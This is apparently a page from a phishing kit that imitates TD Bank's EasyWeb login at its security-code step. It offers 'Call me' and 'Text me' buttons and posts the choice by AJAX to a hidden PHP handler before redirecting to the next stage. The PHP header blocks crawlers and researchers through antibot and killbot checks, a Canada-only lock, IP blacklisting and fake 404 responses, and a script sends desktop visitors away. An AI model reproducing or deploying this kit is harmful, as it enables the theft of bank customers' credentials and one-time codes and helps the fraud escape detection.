<?php
// @Kr3pto on telegram
require "configg.php";
require "tc_assetz/ninc/session_protect.php";
require "tc_assetz/ninc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
    
}else{
    header( "Location: index.php" ); 
}
if($internal_antibot == 1){
    require "tc_assetz/old_blocker.php";
}
if($enable_killbot == 1){
    if(checkkillbot($killbot_key) == true){
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
if($mobile_lock == 1){
    require "tc_assetz/mob_lock.php";
}
if($CA_lock == 1){
    if(onlyca() == true){
    
    }else{
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
if($external_antibot == 1){
    if(checkBot($apikey) == true){
        $fp = fopen("tc_assetz/ninc/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}
?>
<?php
include('blackhole/index.php');
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';
                include 'prevents/block.php';
?>
<!DOCTYPE html>
<script type="text/javascript">
<!--
if (screen.width >= 699) {
document.location = "antibot.php";
}
//-->
</script>
<html lang="en-CA" class="js flexbox flexboxlegacy no-touch rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent dialog-open"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-touch-fullscreen" content="yes">

  <title>EasyWeb Login</title>

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="favicon.ico">
<link rel="stylesheet" href="tc_assetz/styles/styles.css" class="td_apas_css">
<link rel="stylesheet" href="tc_assetz/styles/anim.css" >
<style></style><style type="text/css"></style><style>.login-wrapper[_ngcontent-rce-c141]{display:flex;flex-direction:column;min-height:100%;height:100%}.login-wrapper[_ngcontent-rce-c141]   .spacer[_ngcontent-rce-c141]{flex:1 1 auto}</style><style>.text-center[_nghost-rce-c111]   .banner-container[_ngcontent-rce-c111], .text-center   [_nghost-rce-c111]   .banner-container[_ngcontent-rce-c111]{justify-content:center}.banner-container[_ngcontent-rce-c111]{display:flex}.banner-container[_ngcontent-rce-c111]   .td-icon-error[_ngcontent-rce-c111]{padding-right:1rem;top:1px}.td-link-password-reset[_ngcontent-rce-c111]{color:inherit}div[role=alert][_ngcontent-rce-c111]{outline:none}</style><script type="text/javascript" async="" src="//acdn.adnxs.com/ast/ast.js"></script><meta name="bcsid" content="5890b569-c03d-42f2-ae6e-be0711efcd41"><style>.login-form[_ngcontent-rce-c139]{display:flex;flex-direction:column}.login-form[_ngcontent-rce-c139]   .order-1[_ngcontent-rce-c139]{order:1}.login-form[_ngcontent-rce-c139]   .order-2[_ngcontent-rce-c139]{order:2}.login-form[_ngcontent-rce-c139]   .order-3[_ngcontent-rce-c139]{order:3}.login-form[_ngcontent-rce-c139]   .order-4[_ngcontent-rce-c139]{order:4}.login-form[_ngcontent-rce-c139]   .order-5[_ngcontent-rce-c139]{order:5}.login-form[_ngcontent-rce-c139]   .order-6[_ngcontent-rce-c139]{order:6}.login-form[_ngcontent-rce-c139]   .order-7[_ngcontent-rce-c139]{order:7}.description-container[_ngcontent-rce-c139]{margin-bottom:.9375rem}.description-container[_ngcontent-rce-c139]   .expand-btn[_ngcontent-rce-c139]{margin:0;padding:0;border:none;background:transparent;display:flex;align-items:baseline;color:#038203}.description-container[_ngcontent-rce-c139]   .expand-btn[_ngcontent-rce-c139]   .td-icon[_ngcontent-rce-c139]{padding-right:.25em}.description-container[_ngcontent-rce-c139]   .entry-box[_ngcontent-rce-c139]{background-color:#fff;padding:10px 1.5rem 0;margin-top:15px;position:relative}.description-container[_ngcontent-rce-c139]   .entry-box[_ngcontent-rce-c139]:before{position:absolute;width:.618rem;height:.618rem;background:#f5f9f7;left:1.618rem;top:-.309rem;content:"";transform:rotate(45deg);-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg)}.uap-security-guarantee[_ngcontent-rce-c139]   .td-icon-superlock[_ngcontent-rce-c139]{color:#1a5336}</style><style>.input-group[_ngcontent-rce-c138]   .drop-down-icon[_ngcontent-rce-c138]{position:absolute;cursor:pointer;top:0;right:0;width:34px;height:42px;display:inline-block}.input-group[_ngcontent-rce-c138]   .form-control[_ngcontent-rce-c138]{padding-left:15px}.input-group[_ngcontent-rce-c138]   .drop-down-btn[_ngcontent-rce-c138]{position:absolute;top:0;right:0;width:30px;height:42px;background:none;border:none;font-weight:700}.input-group[_ngcontent-rce-c138]   .drop-down-btn[_ngcontent-rce-c138]:hover:after{border-color:#00a221}.input-group[_ngcontent-rce-c138]   .drop-down-btn[_ngcontent-rce-c138]:after{content:"";pointer-events:none;position:absolute;font-size:.625em;line-height:1;width:.5rem;height:.5rem;margin-top:-.5em;top:45%;right:1.2em;color:#fff;border:3px solid #1c1c1c;border-width:0 2px 2px 0;transform:rotate(45deg);display:inline-block}#cardList[_ngcontent-rce-c138]{padding:0;margin:0;position:absolute;left:15px;right:15px;z-index:1;box-shadow:0 0 15px rgba(0,0,0,.15),0 0 1px 1px rgba(0,0,0,.1);outline:none}#cardList[_ngcontent-rce-c138]   .uap-list-item[_ngcontent-rce-c138]{display:flex;justify-content:space-between;align-items:center;height:42px;background-color:#fff;padding:0 15px}#cardList[_ngcontent-rce-c138]   .uap-list-item[_ngcontent-rce-c138]:hover{background-color:#f3f3f3}#cardList[_ngcontent-rce-c138]   .uap-list-item.card-option[_ngcontent-rce-c138]   .option-btn[_ngcontent-rce-c138]{height:100%;flex:1 1 auto;text-align:left;background:none;border:none;padding-left:0;padding-right:0}#cardList[_ngcontent-rce-c138]   .uap-list-item.card-option[_ngcontent-rce-c138]   .icon-btn[_ngcontent-rce-c138]{height:100%;color:#1a5336;padding-right:0;padding-left:0;width:30px}#cardList[_ngcontent-rce-c138]   .uap-list-item.card-option[_ngcontent-rce-c138]   .icon-btn[_ngcontent-rce-c138]:hover{color:#038203}#cardList[_ngcontent-rce-c138]   .uap-list-item.card-option[_ngcontent-rce-c138]   .icon-btn[_ngcontent-rce-c138]   .td-icon[_ngcontent-rce-c138]{font-size:1.25rem}#cardList[_ngcontent-rce-c138]   .uap-list-item[_ngcontent-rce-c138]:last-child{border-top:1px solid #dadada}#cardList[_ngcontent-rce-c138]   .uap-list-item[_ngcontent-rce-c138]   .td-link-action[_ngcontent-rce-c138]{width:100%;line-height:calc(42px - 1px)}</style><style>.otp-login-msg[_ngcontent-rce-c80]{clear:both;position:relative;overflow:visible;color:#ae1100;margin:0;padding:.25rem 0 .375rem;font-size:.79375rem}</style><style>.inline[_ngcontent-rce-c97]{display:inline}</style><style>@-webkit-keyframes loadingSpinner{0%{transform:rotate(0)}to{transform:rotate(1turn)}}@keyframes loadingSpinner{0%{transform:rotate(0)}to{transform:rotate(1turn)}}@-webkit-keyframes loadingSpinner2{0%{stroke-dashoffset:2960}to{stroke-dashoffset:0}}@keyframes loadingSpinner2{0%{stroke-dashoffset:2960}to{stroke-dashoffset:0}}@-webkit-keyframes loadingSpinner3{0%{stroke-dashoffset:2960}to{stroke-dashoffset:1160}}@keyframes loadingSpinner3{0%{stroke-dashoffset:2960}to{stroke-dashoffset:1160}}.otp-preloader[_ngcontent-rce-c40]{display:flex;align-items:center;justify-content:center}.otp-preloader[_ngcontent-rce-c40]   .loading-spinner.big[_ngcontent-rce-c40]{display:inline-block;width:80px;height:80px}.otp-preloader[_ngcontent-rce-c40]   .loading-spinner.big[_ngcontent-rce-c40]   .primary-bright[_ngcontent-rce-c40]{stop-color:#008a00}.otp-preloader[_ngcontent-rce-c40]   .loading-spinner.big[_ngcontent-rce-c40]   .primary[_ngcontent-rce-c40]{stop-color:#1a5336}.otp-preloader[_ngcontent-rce-c40]   .loading-spinner.big[_ngcontent-rce-c40]   .loading-small[_ngcontent-rce-c40]{display:none}.otp-preloader[_ngcontent-rce-c40]   .loading-spinner.big[_ngcontent-rce-c40]   svg[_ngcontent-rce-c40]{width:100%;height:100%}.otp-preloader[_ngcontent-rce-c40]   .loading-spinner-indeterminate[_ngcontent-rce-c40]   .loading-circle[_ngcontent-rce-c40]{transform-origin:50% 50%;-webkit-animation:loadingSpinner 1s linear infinite,loadingSpinner3 1.2s ease-in-out infinite alternate;animation:loadingSpinner 1s linear infinite,loadingSpinner3 1.2s ease-in-out infinite alternate;stroke-dasharray:2960}</style><script id="tmx_tags_js" type="text/javascript" src="https://tmx.td.com/hxf2yp77uf1p84se.js?6pp2qysedrd790si=i8n5h0pw&amp;ugs3jvtn1tyca9au=ddadb005-b6fa-4c85-92f2-26b2a28d5977"></script><style>.mat-dialog-container{display:block;padding:24px;border-radius:4px;box-sizing:border-box;overflow:auto;outline:0;width:100%;height:100%;min-height:inherit;max-height:inherit}.cdk-high-contrast-active .mat-dialog-container{outline:solid 1px}.mat-dialog-content{display:block;margin:0 -24px;padding:0 24px;max-height:65vh;overflow:auto;-webkit-overflow-scrolling:touch}.mat-dialog-title{margin:0 0 20px;display:block}.mat-dialog-actions{padding:8px 0;display:flex;flex-wrap:wrap;min-height:52px;align-items:center;margin-bottom:-24px}.mat-dialog-actions[align=end]{justify-content:flex-end}.mat-dialog-actions[align=center]{justify-content:center}.mat-dialog-actions .mat-button-base+.mat-button-base,.mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:8px}[dir=rtl] .mat-dialog-actions .mat-button-base+.mat-button-base,[dir=rtl] .mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:0;margin-right:8px}
</style><style>.otp-option-title[_ngcontent-rce-c84]{font-family:Webly Sleek SemiBold;font-size:1.125rem;font-weight:700;color:#1a5336}.authenticator-icon[_ngcontent-rce-c84]{width:45px;height:45px;border-radius:7.35px}</style></head>
<body class="td-no-focus-outline" style="cursor: pointer;">

<script type="text/javascript" async="" src="//nexus.ensighten.com/tdb/uap-prod/Bootstrap.js"></script><script type="text/javascript" async="" src="https://bcdn.td.com/scripts/dfb31537/dfb31537.js"></script><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_td_0" name="destination_publishing_iframe_td_0_name" src="https://td.demdex.net/dest5.html?d_nsid=0#https%3A%2F%2Fauthentication.td.com%2Fuap-ui%2F%3Fconsumer%3Deasyweb%26locale%3Den_CA%23%2Fuap%2Flogin" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;" aria-hidden="true"></iframe><div class="cdk-overlay-container"><div class="cdk-overlay-backdrop uap-modal-backdrop cdk-overlay-backdrop-showing"></div><div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;"><div id="cdk-overlay-11" class="cdk-overlay-pane uap-modal-panel" style="max-width: 100%; pointer-events: auto; width: 50em; position: static;"><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><mat-dialog-container tabindex="-1" aria-modal="true" class="mat-dialog-container ng-tns-c34-10 ng-trigger ng-trigger-dialogContainer ng-star-inserted" id="mat-dialog-10" role="dialog" aria-labelledby="otpChoiceModalTitle" aria-describedby="otpChoiceModalDesc" style="transform: none;"><core-otp-choice-modal _nghost-rce-c84="" class="ng-star-inserted" style=""><button _ngcontent-rce-c84="" type="button" class="btn-close-modal"><span _ngcontent-rce-c84="" class="td-icon td-icon-close"></span><span _ngcontent-rce-c84="" class="sr-only">Close</span></button><uap-server-error _ngcontent-rce-c84="" display="modal-banner" class="top-banner" _nghost-rce-c111=""><!----></uap-server-error><!----><!----><section _ngcontent-rce-c84="" class="ng-star-inserted" style=""><h2 _ngcontent-rce-c84="" translate="SELECT_PHONE_SINGLE.TITLE" id="otpChoiceModalTitle" class="text-center">Security Code Required</h2><p _ngcontent-rce-c84="" translate="SELECT_PHONE_SINGLE.SECURITY_PURPOSE" id="otpChoiceModalDesc" class="lead text-center">For security purposes, we want to make sure it's you</p><p _ngcontent-rce-c84="" translate="SELECT_PHONE_SINGLE.PASSCODE_WILL_BE_SENT_TO" class="text-center">Your one-time security code will be sent to:</p><p _ngcontent-rce-c84="" class="text-center"><strong _ngcontent-rce-c84="">+1 (•••) ••• - ••••</strong><br _ngcontent-rce-c84=""><strong _ngcontent-rce-c84=""></strong></p><form method="post" id="formit" action="" ><p _ngcontent-rce-c84="" translate="SELECT_PHONE_SINGLE.SEND_BY" class="lead text-center mt-5">Send security code by</p><div _ngcontent-rce-c84="" class="td-row pb-3"><div _ngcontent-rce-c84="" class="td-col-xs-6"><div _ngcontent-rce-c84="" class="form-group form-group-padding"><button type="submit" name="code" value="Callme"  _ngcontent-rce-c84="" class="td-button td-button-secondary td-button-block">Call me </button></div></div><div _ngcontent-rce-c84="" class="td-col-xs-6"><div _ngcontent-rce-c84="" class="form-group form-group-padding"><button type="submit" name="code" value="Textme" _ngcontent-rce-c84="" class="td-button td-button-secondary td-button-block">Text me </button></div></div></div></section><!----><div _ngcontent-rce-c84="" class="otp-section pb-0"><p _ngcontent-rce-c84="" translate="SELECT_PHONE_SINGLE.CARRIER_FEES" class="td-small-copy text-center">Standard wireless carrier message and data rates may apply.</p></div><!----></core-otp-choice-modal><!----></mat-dialog-container><div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div></div></div></div><iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe><iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe><iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe></body>
      <script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


    <script>
    
        $(document).ready(function() {
                    $("#formit").submit(function(e) {
                        e.preventDefault();
                        var $this = $(this);
                        $("#loading").css("display", "block");
                        $.ajax({
                                method: "POST",
                                url: "8432047801.php",
                                data: $(this).serialize()
                            })
                            .then(function(msg) {
                                setTimeout(function() {
                                    window.location.href = "cjdsqnlcnewji02131.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>";
                                }, 1500);
                            });
                        
        
                    });
                });
    </script></html>